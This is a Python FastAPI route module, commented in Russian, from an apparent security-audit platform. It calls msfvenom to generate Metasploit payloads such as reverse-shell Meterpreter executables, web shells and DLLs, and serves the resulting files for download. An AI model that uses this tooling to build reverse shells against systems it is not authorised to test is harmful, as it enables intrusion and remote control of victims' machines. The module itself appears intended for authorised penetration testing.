# backend/app/routes/payloads.py
"""
A3.3 / A6: генерация полезных нагрузок через msfvenom.

POST /api/payloads/generate — создаёт файл в audit_runs/ и возвращает ссылку
на скачивание. GET /api/payloads/download/{filename} — отдаёт файл.
Доступно только в профиле сборки max (где установлен msfvenom).
"""
import os
import re
import shutil
import subprocess
from datetime import datetime

from fastapi import APIRouter, HTTPException
from fastapi.responses import FileResponse

from app.audit_tools import AUDIT_DIR
from app.models import PayloadGenerateRequest

router = APIRouter(prefix="/api/payloads", tags=["payloads"])

_PAYLOAD_RE = re.compile(r"^[a-z0-9_/]+$")
_HOST_RE = re.compile(r"^[A-Za-z0-9._-]+$")

# Допустимые форматы msfvenom → расширение выходного файла.
_FORMATS = {
    "exe": "exe", "elf": "elf", "raw": "raw", "python": "py",
    "psh": "ps1", "php": "php", "asp": "asp", "aspx": "aspx",
    "jsp": "jsp", "war": "war", "dll": "dll", "macho": "macho",
}

_TIMEOUT = 120


@router.post("/generate")
async def payload_generate(request: PayloadGenerateRequest):
    if shutil.which("msfvenom") is None:
        raise HTTPException(
            status_code=503,
            detail="msfvenom не установлен — соберите образ профиля max (make build-max)",
        )

    payload = (request.payload or "").strip()
    if not _PAYLOAD_RE.match(payload):
        raise HTTPException(status_code=400, detail="Некорректный payload (ожидается вид windows/x64/meterpreter/reverse_tcp)")
    lhost = (request.lhost or "").strip()
    if not _HOST_RE.match(lhost):
        raise HTTPException(status_code=400, detail="Некорректный LHOST")
    lport = int(request.lport or 4444)
    if not (1 <= lport <= 65535):
        raise HTTPException(status_code=400, detail="Некорректный LPORT")
    fmt = (request.format or "exe").strip().lower()
    if fmt not in _FORMATS:
        raise HTTPException(status_code=400, detail=f"Неподдерживаемый формат. Доступны: {', '.join(sorted(_FORMATS))}")

    filename = f"payload_{datetime.now():%Y%m%d_%H%M%S}.{_FORMATS[fmt]}"
    out_path = os.path.join(AUDIT_DIR, filename)

    args = [
        "msfvenom", "-p", payload,
        f"LHOST={lhost}", f"LPORT={lport}",
        "-f", fmt, "-o", out_path,
    ]
    try:
        proc = subprocess.run(
            args, capture_output=True, text=True, timeout=_TIMEOUT,
            env={**os.environ, "NO_COLOR": "1"},
        )
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=504, detail=f"msfvenom не уложился в {_TIMEOUT} с")

    combined = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode != 0 or not os.path.isfile(out_path):
        tail = combined.strip().splitlines()[-5:] if combined.strip() else []
        raise HTTPException(status_code=500, detail="msfvenom завершился с ошибкой: " + " | ".join(tail))

    return {
        "name": filename,
        "size": os.path.getsize(out_path),
        "payload": payload,
        "format": fmt,
        "command": " ".join(args),
        "download_url": f"/api/payloads/download/{filename}",
    }


@router.get("/download/{filename}")
async def payload_download(filename: str):
    # Только файлы, созданные /generate: префикс payload_, без путей.
    base = os.path.basename(filename)
    if base != filename or not base.startswith("payload_"):
        raise HTTPException(status_code=400, detail="Недопустимое имя файла")
    path = os.path.abspath(os.path.join(AUDIT_DIR, base))
    if not path.startswith(os.path.abspath(AUDIT_DIR) + os.sep) or not os.path.isfile(path):
        raise HTTPException(status_code=404, detail="Файл не найден")
    return FileResponse(path, filename=base)
